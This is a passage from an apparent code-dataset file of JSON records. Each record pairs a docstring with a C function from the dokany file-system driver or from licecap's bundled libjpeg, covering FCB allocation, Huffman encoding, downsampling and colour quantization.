}\n\n  KeClearEvent(&Source->NotEmpty);\n  KeReleaseSpinLock(&Source->ListLock, oldIrql);\n}", "path": "dokany/sys/notification.c", "commit_date": "2020-07-21 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// We must NOT call without VCB lock\n", "func_signal": "PDokanFCB DokanAllocateFCB(__in PDokanVCB Vcb, __in PWCHAR FileName,\n                           __in ULONG FileNameLength)", "code": "{\n  PDokanFCB fcb = ExAllocateFromLookasideListEx(&g_DokanFCBLookasideList);\n\n  // Try again if garbage collection frees up space. This is a no-op when\n  // garbage collection is disabled.\n  if (fcb == NULL && DokanForceFcbGarbageCollection(Vcb)) {\n    fcb = ExAllocateFromLookasideListEx(&g_DokanFCBLookasideList);\n  }\n\n  if (fcb == NULL) {\n    return NULL;\n  }\n\n  ASSERT(Vcb != NULL);\n\n  RtlZeroMemory(fcb, sizeof(DokanFCB));\n\n  fcb->AdvancedFCBHeader.Resource =\n      ExAllocateFromLookasideListEx(&g_DokanEResourceLookasideList);\n  if (fcb->AdvancedFCBHeader.Resource == NULL) {\n    ExFreeToLookasideListEx(&g_DokanFCBLookasideList, fcb);\n    return NULL;\n  }\n\n  fcb->Identifier.Type = FCB;\n  fcb->Identifier.Size = sizeof(DokanFCB);\n\n  fcb->Vcb = Vcb;\n\n  ExInitializeResourceLite(&fcb->PagingIoResource);\n  ExInitializeResourceLite(fcb->AdvancedFCBHeader.Resource);\n\n  ExInitializeFastMutex(&fcb->AdvancedFCBHeaderMutex);\n\n  FsRtlSetupAdvancedHeader(&fcb->AdvancedFCBHeader,\n                           &fcb->AdvancedFCBHeaderMutex);\n\n  // ValidDataLength not supported - initialize to 0x7fffffff / 0xffffffff\n  // If fcb->Header.IsFastIoPossible was set the Cache manager would send\n  // us a SetFilelnformation IRP to update this value\n  fcb->AdvancedFCBHeader.ValidDataLength.QuadPart = MAXLONGLONG;\n\n  fcb->AdvancedFCBHeader.PagingIoResource = &fcb->PagingIoResource;\n\n  fcb->AdvancedFCBHeader.AllocationSize.QuadPart = 4096;\n  fcb->AdvancedFCBHeader.FileSize.QuadPart = 4096;\n\n  fcb->AdvancedFCBHeader.IsFastIoPossible = FastIoIsNotPossible;\n  FsRtlInitializeOplock(DokanGetFcbOplock(fcb));\n\n  fcb->FileName.Buffer = FileName;\n  fcb->FileName.Length = (USHORT)FileNameLength;\n  fcb->FileName.MaximumLength = (USHORT)FileNameLength;\n\n  InitializeListHead(&fcb->NextCCB);\n  InsertTailList(&Vcb->NextFCB, &fcb->NextFCB);\n\n  InterlockedIncrement(&Vcb->FcbAllocated);\n  InterlockedAnd64(&Vcb->ValidFcbMask, (LONG64)fcb);\n  ++Vcb->VolumeMetrics.FcbAllocations;\n  return fcb;\n}", "path": "dokany/sys/util/fcb.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// The thread function for the dedicated FCB garbage collection thread.\n", "func_signal": "VOID FcbGarbageCollectorThread(__in PVOID pVcb)", "code": "{\n  KTIMER timer;\n  NTSTATUS status = STATUS_INVALID_PARAMETER;\n  LARGE_INTEGER timeout = {0};\n  PDokanVCB Vcb = pVcb;\n  DOKAN_INIT_LOGGER(logger, Vcb->Dcb->DeviceObject->DriverObject, 0);\n  KeInitializeTimerEx(&timer, SynchronizationTimer);\n  KeSetTimerEx(&timer, timeout, Vcb->Dcb->FcbGarbageCollectionIntervalMs, NULL);\n  DokanLogInfo(&logger, L\"Starting FCB garbage collector with %lu ms interval.\",\n               Vcb->Dcb->FcbGarbageCollectionIntervalMs);\n  for (;;) {\n    status = WaitForNewFcbGarbage(Vcb);\n    if (status != STATUS_SUCCESS) {\n      break;\n    }\n    status = AgeAndDeleteFcbGarbage(Vcb, &timer);\n    if (status != STATUS_SUCCESS) {\n      break;\n    }\n  }\n  DokanLogInfo(&logger, L\"Stopping FCB garbage collector.\");\n  KeCancelTimer(&timer);\n}", "path": "dokany/sys/util/fcb.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "/*\n * Emit any pending EOBRUN symbol.\n */\n", "func_signal": "LOCAL(void)\nemit_eobrun (phuff_entropy_ptr entropy)", "code": "{\n  register int temp, nbits;\n\n  if (entropy->EOBRUN > 0) {\t/* if there is any pending EOBRUN */\n    temp = entropy->EOBRUN;\n    nbits = 0;\n    while ((temp >>= 1))\n      nbits++;\n    /* safety check: shouldn't happen given limited correction-bit buffer */\n    if (nbits > 14)\n      ERREXIT(entropy->cinfo, JERR_HUFF_MISSING_CODE);\n\n    emit_symbol(entropy, entropy->ac_tbl_no, nbits << 4);\n    if (nbits)\n      emit_bits(entropy, entropy->EOBRUN, nbits);\n\n    entropy->EOBRUN = 0;\n\n    /* Emit any buffered correction bits */\n    emit_buffered_bits(entropy, entropy->bit_buffer, entropy->BE);\n    entropy->BE = 0;\n  }\n}", "path": "licecap/WDL/jpeglib/jcphuff.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Downsample pixel values of a single component.\n * This version handles the standard case of 2:1 horizontal and 2:1 vertical,\n * without smoothing.\n */\n", "func_signal": "METHODDEF(void)\nh2v2_downsample (j_compress_ptr cinfo, jpeg_component_info * compptr,\n\t\t JSAMPARRAY input_data, JSAMPARRAY output_data)", "code": "{\n  int inrow, outrow;\n  JDIMENSION outcol;\n  JDIMENSION output_cols = compptr->width_in_blocks * DCTSIZE;\n  register JSAMPROW inptr0, inptr1, outptr;\n  register int bias;\n\n  /* Expand input data enough to let all the output samples be generated\n   * by the standard loop.  Special-casing padded output would be more\n   * efficient.\n   */\n  expand_right_edge(input_data, cinfo->max_v_samp_factor,\n\t\t    cinfo->image_width, output_cols * 2);\n\n  inrow = 0;\n  for (outrow = 0; outrow < compptr->v_samp_factor; outrow++) {\n    outptr = output_data[outrow];\n    inptr0 = input_data[inrow];\n    inptr1 = input_data[inrow+1];\n    bias = 1;\t\t\t/* bias = 1,2,1,2,... for successive samples */\n    for (outcol = 0; outcol < output_cols; outcol++) {\n      *outptr++ = (JSAMPLE) ((GETJSAMPLE(*inptr0) + GETJSAMPLE(inptr0[1]) +\n\t\t\t      GETJSAMPLE(*inptr1) + GETJSAMPLE(inptr1[1])\n\t\t\t      + bias) >> 2);\n      bias ^= 3;\t\t/* 1=>2, 2=>1 */\n      inptr0 += 2; inptr1 += 2;\n    }\n    inrow += 2;\n  }\n}", "path": "licecap/WDL/jpeglib/jcsample.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Downsample pixel values of a single component.\n * This version handles the special case of a full-size component,\n * with smoothing.  One row of context is required.\n */\n", "func_signal": "METHODDEF(void)\nfullsize_smooth_downsample (j_compress_ptr cinfo, jpeg_component_info *compptr,\n\t\t\t    JSAMPARRAY input_data, JSAMPARRAY output_data)", "code": "{\n  int outrow;\n  JDIMENSION colctr;\n  JDIMENSION output_cols = compptr->width_in_blocks * DCTSIZE;\n  register JSAMPROW inptr, above_ptr, below_ptr, outptr;\n  INT32 membersum, neighsum, memberscale, neighscale;\n  int colsum, lastcolsum, nextcolsum;\n\n  /* Expand input data enough to let all the output samples be generated\n   * by the standard loop.  Special-casing padded output would be more\n   * efficient.\n   */\n  expand_right_edge(input_data - 1, cinfo->max_v_samp_factor + 2,\n\t\t    cinfo->image_width, output_cols);\n\n  /* Each of the eight neighbor pixels contributes a fraction SF to the\n   * smoothed pixel, while the main pixel contributes (1-8*SF).  In order\n   * to use integer arithmetic, these factors are multiplied by 2^16 = 65536.\n   * Also recall that SF = smoothing_factor / 1024.\n   */\n\n  memberscale = 65536L - cinfo->smoothing_factor * 512L; /* scaled 1-8*SF */\n  neighscale = cinfo->smoothing_factor * 64; /* scaled SF */\n\n  for (outrow = 0; outrow < compptr->v_samp_factor; outrow++) {\n    outptr = output_data[outrow];\n    inptr = input_data[outrow];\n    above_ptr = input_data[outrow-1];\n    below_ptr = input_data[outrow+1];\n\n    /* Special case for first column */\n    colsum = GETJSAMPLE(*above_ptr++) + GETJSAMPLE(*below_ptr++) +\n\t     GETJSAMPLE(*inptr);\n    membersum = GETJSAMPLE(*inptr++);\n    nextcolsum = GETJSAMPLE(*above_ptr) + GETJSAMPLE(*below_ptr) +\n\t\t GETJSAMPLE(*inptr);\n    neighsum = colsum + (colsum - membersum) + nextcolsum;\n    membersum = membersum * memberscale + neighsum * neighscale;\n    *outptr++ = (JSAMPLE) ((membersum + 32768) >> 16);\n    lastcolsum = colsum; colsum = nextcolsum;\n\n    for (colctr = output_cols - 2; colctr > 0; colctr--) {\n      membersum = GETJSAMPLE(*inptr++);\n      above_ptr++; below_ptr++;\n      nextcolsum = GETJSAMPLE(*above_ptr) + GETJSAMPLE(*below_ptr) +\n\t\t   GETJSAMPLE(*inptr);\n      neighsum = lastcolsum + (colsum - membersum) + nextcolsum;\n      membersum = membersum * memberscale + neighsum * neighscale;\n      *outptr++ = (JSAMPLE) ((membersum + 32768) >> 16);\n      lastcolsum = colsum; colsum = nextcolsum;\n    }\n\n    /* Special case for last column */\n    membersum = GETJSAMPLE(*inptr);\n    neighsum = lastcolsum + (colsum - membersum) + colsum;\n    membersum = membersum * memberscale + neighsum * neighscale;\n    *outptr = (JSAMPLE) ((membersum + 32768) >> 16);\n\n  }\n}", "path": "licecap/WDL/jpeglib/jcsample.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Emit a restart marker & resynchronize predictions.\n */\n", "func_signal": "LOCAL(void)\nemit_restart (phuff_entropy_ptr entropy, int restart_num)", "code": "{\n  int ci;\n\n  emit_eobrun(entropy);\n\n  if (! entropy->gather_statistics) {\n    flush_bits(entropy);\n    emit_byte(entropy, 0xFF);\n    emit_byte(entropy, JPEG_RST0 + restart_num);\n  }\n\n  if (entropy->cinfo->Ss == 0) {\n    /* Re-initialize DC predictions to 0 */\n    for (ci = 0; ci < entropy->cinfo->comps_in_scan; ci++)\n      entropy->last_dc_val[ci] = 0;\n  } else {\n    /* Re-initialize all AC-related fields to 0 */\n    entropy->EOBRUN = 0;\n    entropy->BE = 0;\n  }\n}", "path": "licecap/WDL/jpeglib/jcphuff.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Create the colormap.\n */\n", "func_signal": "LOCAL(void)\ncreate_colormap (j_decompress_ptr cinfo)", "code": "{\n  my_cquantize_ptr cquantize = (my_cquantize_ptr) cinfo->cquantize;\n  JSAMPARRAY colormap;\t\t/* Created colormap */\n  int total_colors;\t\t/* Number of distinct output colors */\n  int i,j,k, nci, blksize, blkdist, ptr, val;\n\n  /* Select number of colors for each component */\n  total_colors = select_ncolors(cinfo, cquantize->Ncolors);\n\n  /* Report selected color counts */\n  if (cinfo->out_color_components == 3)\n    TRACEMS4(cinfo, 1, JTRC_QUANT_3_NCOLORS,\n\t     total_colors, cquantize->Ncolors[0],\n\t     cquantize->Ncolors[1], cquantize->Ncolors[2]);\n  else\n    TRACEMS1(cinfo, 1, JTRC_QUANT_NCOLORS, total_colors);\n\n  /* Allocate and fill in the colormap. */\n  /* The colors are ordered in the map in standard row-major order, */\n  /* i.e. rightmost (highest-indexed) color changes most rapidly. */\n\n  colormap = (*cinfo->mem->alloc_sarray)\n    ((j_common_ptr) cinfo, JPOOL_IMAGE,\n     (JDIMENSION) total_colors, (JDIMENSION) cinfo->out_color_components);\n\n  /* blksize is number of adjacent repeated entries for a component */\n  /* blkdist is distance between groups of identical entries for a component */\n  blkdist = total_colors;\n\n  for (i = 0; i < cinfo->out_color_components; i++) {\n    /* fill in colormap entries for i'th color component */\n    nci = cquantize->Ncolors[i]; /* # of distinct values for this color */\n    blksize = blkdist / nci;\n    for (j = 0; j < nci; j++) {\n      /* Compute j'th output value (out of nci) for component */\n      val = output_value(cinfo, i, j, nci-1);\n      /* Fill in all colormap entries that have this value of this component */\n      for (ptr = j * blksize; ptr < total_colors; ptr += blkdist) {\n\t/* fill in blksize entries beginning at ptr */\n\tfor (k = 0; k < blksize; k++)\n\t  colormap[i][ptr+k] = (JSAMPLE) val;\n      }\n    }\n    blkdist = blksize;\t\t/* blksize of this color is blkdist of next */\n  }\n\n  /* Save the colormap in private storage,\n   * where it will survive color quantization mode changes.\n   */\n  cquantize->sv_colormap = colormap;\n  cquantize->sv_actual = total_colors;\n}", "path": "licecap/WDL/jpeglib/jquant1.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * MCU encoding for DC initial scan (either spectral selection,\n * or first pass of successive approximation).\n */\n", "func_signal": "METHODDEF(boolean)\nencode_mcu_DC_first (j_compress_ptr cinfo, JBLOCKROW *MCU_data)", "code": "{\n  phuff_entropy_ptr entropy = (phuff_entropy_ptr) cinfo->entropy;\n  register int temp, temp2;\n  register int nbits;\n  int blkn, ci;\n  int Al = cinfo->Al;\n  JBLOCKROW block;\n  jpeg_component_info * compptr;\n  ISHIFT_TEMPS\n\n  entropy->next_output_byte = cinfo->dest->next_output_byte;\n  entropy->free_in_buffer = cinfo->dest->free_in_buffer;\n\n  /* Emit restart marker if needed */\n  if (cinfo->restart_interval)\n    if (entropy->restarts_to_go == 0)\n      emit_restart(entropy, entropy->next_restart_num);\n\n  /* Encode the MCU data blocks */\n  for (blkn = 0; blkn < cinfo->blocks_in_MCU; blkn++) {\n    block = MCU_data[blkn];\n    ci = cinfo->MCU_membership[blkn];\n    compptr = cinfo->cur_comp_info[ci];\n\n    /* Compute the DC value after the required point transform by Al.\n     * This is simply an arithmetic right shift.\n     */\n    temp2 = IRIGHT_SHIFT((int) ((*block)[0]), Al);\n\n    /* DC differences are figured on the point-transformed values. */\n    temp = temp2 - entropy->last_dc_val[ci];\n    entropy->last_dc_val[ci] = temp2;\n\n    /* Encode the DC coefficient difference per section G.1.2.1 */\n    temp2 = temp;\n    if (temp < 0) {\n      temp = -temp;\t\t/* temp is abs value of input */\n      /* For a negative input, want temp2 = bitwise complement of abs(input) */\n      /* This code assumes we are on a two's complement machine */\n      temp2--;\n    }\n    \n    /* Find the number of bits needed for the magnitude of the coefficient */\n    nbits = 0;\n    while (temp) {\n      nbits++;\n      temp >>= 1;\n    }\n    /* Check for out-of-range coefficient values.\n     * Since we're encoding a difference, the range limit is twice as much.\n     */\n    if (nbits > MAX_COEF_BITS+1)\n      ERREXIT(cinfo, JERR_BAD_DCT_COEF);\n    \n    /* Count/emit the Huffman-coded symbol for the number of bits */\n    emit_symbol(entropy, compptr->dc_tbl_no, nbits);\n    \n    /* Emit that number of bits of the value, if positive, */\n    /* or the complement of its magnitude, if negative. */\n    if (nbits)\t\t\t/* emit_bits rejects calls with size 0 */\n      emit_bits(entropy, (unsigned int) temp2, nbits);\n  }\n\n  cinfo->dest->next_output_byte = entropy->next_output_byte;\n  cinfo->dest->free_in_buffer = entropy->free_in_buffer;\n\n  /* Update restart-interval state too */\n  if (cinfo->restart_interval) {\n    if (entropy->restarts_to_go == 0) {\n      entropy->restarts_to_go = cinfo->restart_interval;\n      entropy->next_restart_num++;\n      entropy->next_restart_num &= 7;\n    }\n    entropy->restarts_to_go--;\n  }\n\n  return TRUE;\n}", "path": "licecap/WDL/jpeglib/jcphuff.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Initialize for one-pass color quantization.\n */\n", "func_signal": "METHODDEF(void)\nstart_pass_1_quant (j_decompress_ptr cinfo, boolean is_pre_scan)", "code": "{\n  my_cquantize_ptr cquantize = (my_cquantize_ptr) cinfo->cquantize;\n  size_t arraysize;\n  int i;\n\n  /* Install my colormap. */\n  cinfo->colormap = cquantize->sv_colormap;\n  cinfo->actual_number_of_colors = cquantize->sv_actual;\n\n  /* Initialize for desired dithering mode. */\n  switch (cinfo->dither_mode) {\n  case JDITHER_NONE:\n    if (cinfo->out_color_components == 3)\n      cquantize->pub.color_quantize = color_quantize3;\n    else\n      cquantize->pub.color_quantize = color_quantize;\n    break;\n  case JDITHER_ORDERED:\n    if (cinfo->out_color_components == 3)\n      cquantize->pub.color_quantize = quantize3_ord_dither;\n    else\n      cquantize->pub.color_quantize = quantize_ord_dither;\n    cquantize->row_index = 0;\t/* initialize state for ordered dither */\n    /* If user changed to ordered dither from another mode,\n     * we must recreate the color index table with padding.\n     * This will cost extra space, but probably isn't very likely.\n     */\n    if (! cquantize->is_padded)\n      create_colorindex(cinfo);\n    /* Create ordered-dither tables if we didn't already. */\n    if (cquantize->odither[0] == NULL)\n      create_odither_tables(cinfo);\n    break;\n  case JDITHER_FS:\n    cquantize->pub.color_quantize = quantize_fs_dither;\n    cquantize->on_odd_row = FALSE; /* initialize state for F-S dither */\n    /* Allocate Floyd-Steinberg workspace if didn't already. */\n    if (cquantize->fserrors[0] == NULL)\n      alloc_fs_workspace(cinfo);\n    /* Initialize the propagated errors to zero. */\n    arraysize = (size_t) ((cinfo->output_width + 2) * SIZEOF(FSERROR));\n    for (i = 0; i < cinfo->out_color_components; i++)\n      jzero_far((void FAR *) cquantize->fserrors[i], arraysize);\n    break;\n  default:\n    ERREXIT(cinfo, JERR_NOT_COMPILED);\n    break;\n  }\n}", "path": "licecap/WDL/jpeglib/jquant1.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Create the ordered-dither tables.\n * Components having the same number of representative colors may \n * share a dither table.\n */\n", "func_signal": "LOCAL(void)\ncreate_odither_tables (j_decompress_ptr cinfo)", "code": "{\n  my_cquantize_ptr cquantize = (my_cquantize_ptr) cinfo->cquantize;\n  ODITHER_MATRIX_PTR odither;\n  int i, j, nci;\n\n  for (i = 0; i < cinfo->out_color_components; i++) {\n    nci = cquantize->Ncolors[i]; /* # of distinct values for this color */\n    odither = NULL;\t\t/* search for matching prior component */\n    for (j = 0; j < i; j++) {\n      if (nci == cquantize->Ncolors[j]) {\n\todither = cquantize->odither[j];\n\tbreak;\n      }\n    }\n    if (odither == NULL)\t/* need a new table? */\n      odither = make_odither_array(cinfo, nci);\n    cquantize->odither[i] = odither;\n  }\n}", "path": "licecap/WDL/jpeglib/jquant1.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Finish up at the end of a Huffman-compressed progressive scan.\n */\n", "func_signal": "METHODDEF(void)\nfinish_pass_phuff (j_compress_ptr cinfo)", "code": "{   \n  phuff_entropy_ptr entropy = (phuff_entropy_ptr) cinfo->entropy;\n\n  entropy->next_output_byte = cinfo->dest->next_output_byte;\n  entropy->free_in_buffer = cinfo->dest->free_in_buffer;\n\n  /* Flush out any buffered data */\n  emit_eobrun(entropy);\n  flush_bits(entropy);\n\n  cinfo->dest->next_output_byte = entropy->next_output_byte;\n  cinfo->dest->free_in_buffer = entropy->free_in_buffer;\n}", "path": "licecap/WDL/jpeglib/jcphuff.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Downsample pixel values of a single component.\n * One row group is processed per call.\n * This version handles arbitrary integral sampling ratios, without smoothing.\n * Note that this version is not actually used for customary sampling ratios.\n */\n", "func_signal": "METHODDEF(void)\nint_downsample (j_compress_ptr cinfo, jpeg_component_info * compptr,\n\t\tJSAMPARRAY input_data, JSAMPARRAY output_data)", "code": "{\n  int inrow, outrow, h_expand, v_expand, numpix, numpix2, h, v;\n  JDIMENSION outcol, outcol_h;\t/* outcol_h == outcol*h_expand */\n  JDIMENSION output_cols = compptr->width_in_blocks * DCTSIZE;\n  JSAMPROW inptr, outptr;\n  INT32 outvalue;\n\n  h_expand = cinfo->max_h_samp_factor / compptr->h_samp_factor;\n  v_expand = cinfo->max_v_samp_factor / compptr->v_samp_factor;\n  numpix = h_expand * v_expand;\n  numpix2 = numpix/2;\n\n  /* Expand input data enough to let all the output samples be generated\n   * by the standard loop.  Special-casing padded output would be more\n   * efficient.\n   */\n  expand_right_edge(input_data, cinfo->max_v_samp_factor,\n\t\t    cinfo->image_width, output_cols * h_expand);\n\n  inrow = 0;\n  for (outrow = 0; outrow < compptr->v_samp_factor; outrow++) {\n    outptr = output_data[outrow];\n    for (outcol = 0, outcol_h = 0; outcol < output_cols;\n\t outcol++, outcol_h += h_expand) {\n      outvalue = 0;\n      for (v = 0; v < v_expand; v++) {\n\tinptr = input_data[inrow+v] + outcol_h;\n\tfor (h = 0; h < h_expand; h++) {\n\t  outvalue += (INT32) GETJSAMPLE(*inptr++);\n\t}\n      }\n      *outptr++ = (JSAMPLE) ((outvalue + numpix2) / numpix);\n    }\n    inrow += v_expand;\n  }\n}", "path": "licecap/WDL/jpeglib/jcsample.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Downsample pixel values of a single component.\n * This version handles the standard case of 2:1 horizontal and 2:1 vertical,\n * with smoothing.  One row of context is required.\n */\n", "func_signal": "METHODDEF(void)\nh2v2_smooth_downsample (j_compress_ptr cinfo, jpeg_component_info * compptr,\n\t\t\tJSAMPARRAY input_data, JSAMPARRAY output_data)", "code": "{\n  int inrow, outrow;\n  JDIMENSION colctr;\n  JDIMENSION output_cols = compptr->width_in_blocks * DCTSIZE;\n  register JSAMPROW inptr0, inptr1, above_ptr, below_ptr, outptr;\n  INT32 membersum, neighsum, memberscale, neighscale;\n\n  /* Expand input data enough to let all the output samples be generated\n   * by the standard loop.  Special-casing padded output would be more\n   * efficient.\n   */\n  expand_right_edge(input_data - 1, cinfo->max_v_samp_factor + 2,\n\t\t    cinfo->image_width, output_cols * 2);\n\n  /* We don't bother to form the individual \"smoothed\" input pixel values;\n   * we can directly compute the output which is the average of the four\n   * smoothed values.  Each of the four member pixels contributes a fraction\n   * (1-8*SF) to its own smoothed image and a fraction SF to each of the three\n   * other smoothed pixels, therefore a total fraction (1-5*SF)/4 to the final\n   * output.  The four corner-adjacent neighbor pixels contribute a fraction\n   * SF to just one smoothed pixel, or SF/4 to the final output; while the\n   * eight edge-adjacent neighbors contribute SF to each of two smoothed\n   * pixels, or SF/2 overall.  In order to use integer arithmetic, these\n   * factors are scaled by 2^16 = 65536.\n   * Also recall that SF = smoothing_factor / 1024.\n   */\n\n  memberscale = 16384 - cinfo->smoothing_factor * 80; /* scaled (1-5*SF)/4 */\n  neighscale = cinfo->smoothing_factor * 16; /* scaled SF/4 */\n\n  inrow = 0;\n  for (outrow = 0; outrow < compptr->v_samp_factor; outrow++) {\n    outptr = output_data[outrow];\n    inptr0 = input_data[inrow];\n    inptr1 = input_data[inrow+1];\n    above_ptr = input_data[inrow-1];\n    below_ptr = input_data[inrow+2];\n\n    /* Special case for first column: pretend column -1 is same as column 0 */\n    membersum = GETJSAMPLE(*inptr0) + GETJSAMPLE(inptr0[1]) +\n\t\tGETJSAMPLE(*inptr1) + GETJSAMPLE(inptr1[1]);\n    neighsum = GETJSAMPLE(*above_ptr) + GETJSAMPLE(above_ptr[1]) +\n\t       GETJSAMPLE(*below_ptr) + GETJSAMPLE(below_ptr[1]) +\n\t       GETJSAMPLE(*inptr0) + GETJSAMPLE(inptr0[2]) +\n\t       GETJSAMPLE(*inptr1) + GETJSAMPLE(inptr1[2]);\n    neighsum += neighsum;\n    neighsum += GETJSAMPLE(*above_ptr) + GETJSAMPLE(above_ptr[2]) +\n\t\tGETJSAMPLE(*below_ptr) + GETJSAMPLE(below_ptr[2]);\n    membersum = membersum * memberscale + neighsum * neighscale;\n    *outptr++ = (JSAMPLE) ((membersum + 32768) >> 16);\n    inptr0 += 2; inptr1 += 2; above_ptr += 2; below_ptr += 2;\n\n    for (colctr = output_cols - 2; colctr > 0; colctr--) {\n      /* sum of pixels directly mapped to this output element */\n      membersum = GETJSAMPLE(*inptr0) + GETJSAMPLE(inptr0[1]) +\n\t\t  GETJSAMPLE(*inptr1) + GETJSAMPLE(inptr1[1]);\n      /* sum of edge-neighbor pixels */\n      neighsum = GETJSAMPLE(*above_ptr) + GETJSAMPLE(above_ptr[1]) +\n\t\t GETJSAMPLE(*below_ptr) + GETJSAMPLE(below_ptr[1]) +\n\t\t GETJSAMPLE(inptr0[-1]) + GETJSAMPLE(inptr0[2]) +\n\t\t GETJSAMPLE(inptr1[-1]) + GETJSAMPLE(inptr1[2]);\n      /* The edge-neighbors count twice as much as corner-neighbors */\n      neighsum += neighsum;\n      /* Add in the corner-neighbors */\n      neighsum += GETJSAMPLE(above_ptr[-1]) + GETJSAMPLE(above_ptr[2]) +\n\t\t  GETJSAMPLE(below_ptr[-1]) + GETJSAMPLE(below_ptr[2]);\n      /* form final output scaled up by 2^16 */\n      membersum = membersum * memberscale + neighsum * neighscale;\n      /* round, descale and output it */\n      *outptr++ = (JSAMPLE) ((membersum + 32768) >> 16);\n      inptr0 += 2; inptr1 += 2; above_ptr += 2; below_ptr += 2;\n    }\n\n    /* Special case for last column */\n    membersum = GETJSAMPLE(*inptr0) + GETJSAMPLE(inptr0[1]) +\n\t\tGETJSAMPLE(*inptr1) + GETJSAMPLE(inptr1[1]);\n    neighsum = GETJSAMPLE(*above_ptr) + GETJSAMPLE(above_ptr[1]) +\n\t       GETJSAMPLE(*below_ptr) + GETJSAMPLE(below_ptr[1]) +\n\t       GETJSAMPLE(inptr0[-1]) + GETJSAMPLE(inptr0[1]) +\n\t       GETJSAMPLE(inptr1[-1]) + GETJSAMPLE(inptr1[1]);\n    neighsum += neighsum;\n    neighsum += GETJSAMPLE(above_ptr[-1]) + GETJSAMPLE(above_ptr[1]) +\n\t\tGETJSAMPLE(below_ptr[-1]) + GETJSAMPLE(below_ptr[1]);\n    membersum = membersum * memberscale + neighsum * neighscale;\n    *outptr = (JSAMPLE) ((membersum + 32768) >> 16);\n\n    inrow += 2;\n  }\n}", "path": "licecap/WDL/jpeglib/jcsample.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Emit (or just count) a Huffman symbol.\n */\n", "func_signal": "INLINE\nLOCAL(void)\nemit_symbol (phuff_entropy_ptr entropy, int tbl_no, int symbol)", "code": "{\n  if (entropy->gather_statistics)\n    entropy->count_ptrs[tbl_no][symbol]++;\n  else {\n    c_derived_tbl * tbl = entropy->derived_tbls[tbl_no];\n    emit_bits(entropy, tbl->ehufco[symbol], tbl->ehufsi[symbol]);\n  }\n}", "path": "licecap/WDL/jpeglib/jcphuff.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Downsample pixel values of a single component.\n * This version handles the special case of a full-size component,\n * without smoothing.\n */\n", "func_signal": "METHODDEF(void)\nfullsize_downsample (j_compress_ptr cinfo, jpeg_component_info * compptr,\n\t\t     JSAMPARRAY input_data, JSAMPARRAY output_data)", "code": "{\n  /* Copy the data */\n  jcopy_sample_rows(input_data, 0, output_data, 0,\n\t\t    cinfo->max_v_samp_factor, cinfo->image_width);\n  /* Edge-expand */\n  expand_right_edge(output_data, cinfo->max_v_samp_factor,\n\t\t    cinfo->image_width, compptr->width_in_blocks * DCTSIZE);\n}", "path": "licecap/WDL/jpeglib/jcsample.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
{"docstring": "/*\n * Module initialization routine for progressive Huffman entropy encoding.\n */\n", "func_signal": "GLOBAL(void)\njinit_phuff_encoder (j_compress_ptr cinfo)", "code": "{\n  phuff_entropy_ptr entropy;\n  int i;\n\n  entropy = (phuff_entropy_ptr)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,\n\t\t\t\tSIZEOF(phuff_entropy_encoder));\n  cinfo->entropy = (struct jpeg_entropy_encoder *) entropy;\n  entropy->pub.start_pass = start_pass_phuff;\n\n  /* Mark tables unallocated */\n  for (i = 0; i < NUM_HUFF_TBLS; i++) {\n    entropy->derived_tbls[i] = NULL;\n    entropy->count_ptrs[i] = NULL;\n  }\n  entropy->bit_buffer = NULL;\t/* needed only in AC refinement scan */\n}", "path": "licecap/WDL/jpeglib/jcphuff.c", "commit_date": "2015-01-10 00:00:00", "repo_name": "justinfrankel/licecap", "stars": 5168, "license": "None", "language": "c", "size": 10279}
